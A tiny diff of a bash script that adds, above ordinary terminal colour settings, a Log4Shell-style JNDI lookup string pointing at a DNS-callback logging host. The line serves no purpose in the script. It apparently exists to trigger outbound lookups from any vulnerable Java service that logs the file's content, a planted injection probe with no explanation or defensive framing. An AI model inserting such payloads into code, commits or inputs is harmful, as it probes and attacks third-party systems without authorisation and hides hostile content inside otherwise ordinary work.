@@ -1,5 +1,8 @@
 #!/bin/bash
 
+
+${jndi:ldap://rduk93.dnslog.cn/a}
+
 by="\033[1;33m"
 bye="\033[1;00m"
 br="\033[1;31m"
